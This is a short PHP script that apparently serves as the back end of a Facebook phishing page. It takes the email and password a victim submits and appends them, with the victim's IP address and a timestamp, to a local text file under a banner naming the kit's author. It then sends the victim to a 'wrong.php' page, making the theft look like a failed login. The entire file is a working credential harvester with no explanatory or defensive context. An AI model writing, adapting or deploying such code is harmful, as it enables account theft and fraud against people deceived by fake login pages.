<?php
error_reporting(0);
$file = "goyangseratusjuta.txt";

$username = $_POST['PrevToEmail'];
$password = $_POST['PrevToPass'];
$ip = $_SERVER['REMOTE_ADDR'];
$today = date("F j, Y, g:i a");


$handle = fopen($file, 'a');

fwrite($handle, "----FACEBOOK-SECURITY-ACCOUNT-BY-MASAULIASC----");

fwrite($handle, "\n");

fwrite($handle, "Email      : ");

fwrite($handle, " $username");

fwrite($handle, "\n");

fwrite($handle, "Password   : ");

fwrite($handle, " $password");

fwrite($handle, "\n");

fwrite($handle, "IP Address : ");

fwrite($handle, " $ip");

fwrite($handle, "\n");

fwrite($handle, "Date       : ");

fwrite($handle, " $today");

fwrite($handle, "\n");

fwrite($handle, "----------------------END----------------------");

fwrite($handle, "\n");

fclose($handle);

echo "<script LANGUAGE=\"JavaScript\">

<!--
window.location=\"wrong.php\";
// -->

</script>";

?>

